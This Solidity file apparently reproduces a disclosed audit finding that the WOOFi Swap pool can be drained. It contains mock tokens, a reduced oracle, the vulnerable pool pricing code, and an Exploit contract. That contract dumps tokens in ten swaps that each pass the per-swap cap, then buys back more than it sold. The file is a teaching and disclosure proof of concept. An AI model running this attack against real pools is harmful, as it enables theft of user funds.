// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    WOOFi Swap — Pool can be drained (Sherlock, 2024-03-woofi-swap, finding
    #31886, H-1, reporter mstpr-brainbot)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable WooPPV2 PMM math (`_sellBase`/`_sellQuote`, the exact
    `gamma`/`newPrice`/`quoteAmount`/`baseAmount` formulas from
    WooPoolV2/contracts/WooPPV2.sol:L591-648) is inlined verbatim. The
    `maxGamma`/`maxNotionalSwap` guards are checked PER SWAP CALL only — they
    have no memory of prior swaps in the same transaction, so an attacker
    splits a price-crashing dump into pieces that are each individually
    within the cap, then a single bounded reverse swap (capped by the QUOTE
    amount, not the resulting BASE quantity) buys back far more base token
    than was sold, because the price has already collapsed (no fork, no
    cheatcodes, and — matching the real WOO token — no Chainlink price feed
    to bound the manipulation).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20.
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Wooracle — holds the PMM state per base token (price,
///         spread, coeff, feasibility) and lets the pool push a new price
///         after every swap. Real WOO has NO Chainlink price feed, so
///         `woFeasible` is never gated by an external price bound here
///         (faithful to the report: "some tokens like WOO does not have
///         chainlink price feeds ... in that case the attack is feasible").
contract Wooracle {
    struct State {
        uint128 price;
        uint64 spread;
        uint64 coeff;
        bool woFeasible;
    }

    mapping(address => State) public states;

    function setState(address token, uint128 price, uint64 spread, uint64 coeff, bool feasible) external {
        states[token] = State(price, spread, coeff, feasible);
    }

    function state(address token) external view returns (State memory) {
        return states[token];
    }

    /// @dev Real contract: `Wooracle.postPrice` — the pool calls this after
    ///      every swap to persist the price impact for the NEXT swap.
    function postPrice(address token, uint128 newPrice) external {
        states[token].price = newPrice;
    }
}

/// @notice Reduced WooPPV2 pool — faithful reduction of
///         `WooPoolV2/contracts/WooPPV2.sol` (sherlock-audit/2024-03-woofi-swap).
///         Fee claiming, base-to-base swaps, and lending-manager integration
///         are omitted (irrelevant to this bug); the PMM pricing formulas and
///         the per-call `maxGamma`/`maxNotionalSwap` guards are verbatim.
contract WooPool {
    struct TokenInfo {
        uint192 reserve;
        uint16 feeRate;
        uint128 maxGamma;
        uint128 maxNotionalSwap;
    }

    uint256 internal constant PRICE_DEC = 1e8;
    uint256 internal constant QUOTE_DEC = 1e18;
    uint256 internal constant BASE_DEC = 1e18;

    address public quoteToken;
    Wooracle public wooracle;
    address public admin;
    mapping(address => TokenInfo) public tokenInfos;

    constructor(address _quoteToken, address _wooracle) {
        quoteToken = _quoteToken;
        wooracle = Wooracle(_wooracle);
        admin = msg.sender;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "!admin");
        _;
    }

    function setTokenInfo(address token, uint16 feeRate, uint128 maxGamma, uint128 maxNotionalSwap)
        external
        onlyAdmin
    {
        tokenInfos[token].feeRate = feeRate;
        tokenInfos[token].maxGamma = maxGamma;
        tokenInfos[token].maxNotionalSwap = maxNotionalSwap;
    }

    function deposit(address token, uint256 amount) external onlyAdmin {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
        tokenInfos[token].reserve = uint192(tokenInfos[token].reserve + amount);
    }

    /// @dev Real contract: `WooPPV2.swap` dispatcher — reduced to the two
    ///      cases this finding exercises (base<->quote; base-to-base omitted).
    function swap(address fromToken, address toToken, uint256 fromAmount, uint256 minToAmount, address to)
        external
        returns (uint256 realToAmount)
    {
        if (toToken == quoteToken) {
            realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to);
        } else {
            realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to);
        }
    }

    // ============================================================
    //  _sellBase — faithful reduction of WooPPV2.sol:L420-465 +
    //  _calcQuoteAmountSellBase L591-619 — THE BUG (per-call-only guard).
    // ============================================================
    function _sellBase(address baseToken, uint256 baseAmount, uint256 minQuoteAmount, address to)
        internal
        returns (uint256 quoteAmount)
    {
        Wooracle.State memory st = wooracle.state(baseToken);
        require(st.woFeasible, "WooPool: !ORACLE_FEASIBLE");

        uint256 gamma;
        uint256 newPrice;
        {
            uint256 notionalSwap = (baseAmount * st.price * QUOTE_DEC) / BASE_DEC / PRICE_DEC;
            require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, "WooPool: !maxNotionalValue");

            gamma = (baseAmount * st.price * st.coeff) / PRICE_DEC / BASE_DEC;
            // @> VULN: this cap only sees THIS swap's price impact — a dump split into
            // many pieces, each individually <= maxGamma, crashes price far beyond what
            // any SINGLE allowed swap could ever achieve. No cumulative/aggregate limit.
            require(gamma <= tokenInfos[baseToken].maxGamma, "WooPool: !gamma");

            quoteAmount = (((baseAmount * st.price * QUOTE_DEC) / PRICE_DEC) * (uint256(1e18) - gamma - st.spread))
                / 1e18 / BASE_DEC;
            newPrice = ((uint256(1e18) - gamma) * st.price) / 1e18;
        }
        wooracle.postPrice(baseToken, uint128(newPrice));

        uint256 fee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;
        quoteAmount -= fee;
        require(quoteAmount >= minQuoteAmount, "WooPool: quoteAmount_LT_minQuoteAmount");

        MockERC20(baseToken).transferFrom(msg.sender, address(this), baseAmount);
        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve + baseAmount);
        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve - quoteAmount - fee);
        MockERC20(quoteToken).transfer(to, quoteAmount);
    }

    // ============================================================
    //  _sellQuote — faithful reduction of WooPPV2.sol:L467-... +
    //  _calcBaseAmountSellQuote L621-648 — THE PAYOUT LEG.
    // ============================================================
    function _sellQuote(address baseToken, uint256 quoteAmount, uint256 minBaseAmount, address to)
        internal
        returns (uint256 baseAmount)
    {
        uint256 fee = (quoteAmount * tokenInfos[baseToken].feeRate) / 1e5;
        quoteAmount -= fee;

        Wooracle.State memory st = wooracle.state(baseToken);
        require(st.woFeasible, "WooPool: !ORACLE_FEASIBLE");

        uint256 gamma;
        uint256 newPrice;
        {
            require(quoteAmount <= tokenInfos[baseToken].maxNotionalSwap, "WooPool: !maxNotionalValue");

            gamma = (quoteAmount * st.coeff) / QUOTE_DEC;
            require(gamma <= tokenInfos[baseToken].maxGamma, "WooPool: !gamma");

            // @> VULN: the cap bounds the QUOTE amount's price impact — it has no idea
            // how much BASE that converts to. Once price has already been crashed by the
            // split dump above, a gamma-bounded QUOTE amount buys back a disproportionate
            // amount of BASE token: baseAmount grows as 1/price, uncapped by this guard.
            baseAmount = (((quoteAmount * BASE_DEC * PRICE_DEC) / st.price) * (uint256(1e18) - gamma - st.spread))
                / 1e18 / QUOTE_DEC;
            newPrice = (uint256(1e18) * st.price) / (uint256(1e18) - gamma);
        }
        wooracle.postPrice(baseToken, uint128(newPrice));
        require(baseAmount >= minBaseAmount, "WooPool: baseAmount_LT_minBaseAmount");

        MockERC20(quoteToken).transferFrom(msg.sender, address(this), quoteAmount + fee);
        tokenInfos[baseToken].reserve = uint192(tokenInfos[baseToken].reserve - baseAmount);
        tokenInfos[quoteToken].reserve = uint192(tokenInfos[quoteToken].reserve + quoteAmount + fee);
        MockERC20(baseToken).transfer(to, baseAmount);
    }
}

/// @dev Orchestrator + attacker (single account, matching the finding's own
///      PoC which drives the whole attack from one caller). Deploys the WOO
///      / USDC tokens, the oracle, and the pool; bootstraps reserves and PMM
///      parameters (feeRate=0, spread=0 for a clean demonstration — neither
///      affects the bug mechanism); then reproduces the drain end to end.
contract Exploit {
    uint256 public constant PRICE0 = 1e8; // 1.0 in 8-decimals (WOOFi price scale)
    uint256 public constant PIECE = 10_000e18;
    uint256 public constant NUM_PIECES = 10;
    uint256 public constant FULL = PIECE * NUM_PIECES; // 100,000 WOO
    uint64 public constant COEFF = 99_000_000_000_000; // tuned so a single FULL-size swap exceeds MAX_GAMMA
    uint128 public constant MAX_GAMMA = 991_000_000_000_000_000; // 0.991 (per-swap price-impact cap)
    uint256 public constant REVERSE_QUOTE = 5_050_505_050_505_050_505_050; // gamma-optimal single reverse swap
    uint256 public constant POOL_WOO_RESERVE = 200_000e18;
    uint256 public constant POOL_USDC_RESERVE = 1_000_000e18;

    MockERC20 public woo; // CREATE nonce 1
    MockERC20 public usdc; // CREATE nonce 2
    Wooracle public oracle; // CREATE nonce 3
    WooPool public pool; // CREATE nonce 4 — vulnerable

    constructor() {
        woo = new MockERC20();
        usdc = new MockERC20();
        oracle = new Wooracle();
        pool = new WooPool(address(usdc), address(oracle));

        oracle.setState(address(woo), uint128(PRICE0), 0, COEFF, true);
        pool.setTokenInfo(address(woo), 0, MAX_GAMMA, type(uint128).max); // maxNotionalSwap effectively unbounded

        woo.mint(address(this), POOL_WOO_RESERVE + FULL);
        usdc.mint(address(this), POOL_USDC_RESERVE + REVERSE_QUOTE);
        woo.approve(address(pool), type(uint256).max);
        usdc.approve(address(pool), type(uint256).max);
        pool.deposit(address(woo), POOL_WOO_RESERVE);
        pool.deposit(address(usdc), POOL_USDC_RESERVE);
    }

    function run() external {
        uint256 startBalance = woo.balanceOf(address(this)); // == FULL

        // 1. Flash-loaned (here: self-funded) WOO, sold in 10 pieces — each piece
        //    individually respects maxGamma; a single FULL-size swap would revert.
        for (uint256 i = 0; i < NUM_PIECES; i++) {
            pool.swap(address(woo), address(usdc), PIECE, 0, address(this));
        }

        // 2. VULN: one bounded reverse swap, at the now-crashed price, buys back far
        //    more WOO than was sold — the cap never looked at the resulting quantity.
        pool.swap(address(usdc), address(woo), REVERSE_QUOTE, 0, address(this));

        // HARM: attacker walks away with more WOO than it started with — the excess
        // came directly out of the pool's WOO reserve (drained).
        uint256 endBalance = woo.balanceOf(address(this));
        require(endBalance > startBalance, "no profit realized");
    }
}
